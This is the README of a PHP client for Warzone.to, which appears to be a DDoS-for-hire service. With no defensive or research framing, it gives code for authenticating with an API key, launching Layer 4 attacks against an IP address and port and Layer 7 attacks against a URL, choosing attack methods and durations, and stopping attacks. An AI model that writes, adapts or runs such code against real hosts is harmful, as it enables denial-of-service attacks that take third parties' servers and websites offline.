# Warzone.to API
Sample API usage of Warzone.to

## Requirements
PHP version 5.x (+).<br/>
Libcurl package.

## L4/L7 Methods Syntaxe
Available here : https://warzone.to/methods

## Authentication
```php
require 'API.php';
// UserID and API Key generated from API Manager on website.
$userID = "12";
$apiKey = "ABCD-123";
$api = new API($userID, $apiKey);
```

## Layer 4 Attack
```php

$host = "1.1.1.1";
$port = 80;
$time = 15;
$method = 1;

/* Parameters : IPv4 , Port , Time , Method */
$response = $api->startL4($host, $port, $time, $method);
```
## Layer 7 Attack
```php

$host = "https://example.com/";
$time = 15;
$method = 5;

/* Parameters : URL , Time , Method */
$response = $api->startL7($host, $time, $method);
```
## Stop Attack
```php
/* Parameters : Host. */
$response = $api->stopAttack("1.1.1.1");
```

## API Response
```php
/* Echo Response Status */
echo $response->status; // Get API response.

/* Echo Message */
echo $response->message; // Get Message.
```
